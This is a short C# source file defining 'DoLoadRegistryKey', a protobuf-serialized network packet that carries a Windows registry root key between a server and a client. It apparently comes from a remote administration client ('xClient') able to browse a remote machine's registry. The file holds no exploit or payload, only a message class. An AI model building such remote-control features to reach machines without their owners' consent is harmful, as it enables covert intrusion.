using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ProtoBuf;
using Microsoft.Win32;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoLoadRegistryKey : IPacket
    {
        [ProtoMember(1)]
        public object Identifier { get; set; }

        [ProtoMember(2)]
        public RegistryKey RootKey { get; set; }

        public DoLoadRegistryKey(RegistryKey rootKey, object identifier = null)
        {
            Identifier = identifier;
            RootKey = rootKey;
        }

        public void Execute(Client client)
        {
            client.SendBlocking(this);
        }
    }
}